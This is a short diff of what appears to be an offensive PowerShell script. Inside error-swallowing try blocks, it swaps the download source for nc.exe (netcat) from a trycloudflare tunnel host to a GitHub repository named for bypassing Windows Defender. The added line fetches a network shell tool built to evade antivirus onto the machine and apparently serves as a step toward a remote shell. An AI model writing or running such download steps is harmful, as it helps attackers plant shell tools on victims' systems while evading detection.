@@ -13,7 +13,7 @@ try {
 } catch {}
 
 try {
-    Invoke-WebRequest -Uri "https://currently-marco-attempted-ours.trycloudflare.com/nc.exe" -OutFile $NcPath
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/nc.exe" -OutFile $NcPath
 } catch {}
 
 try {
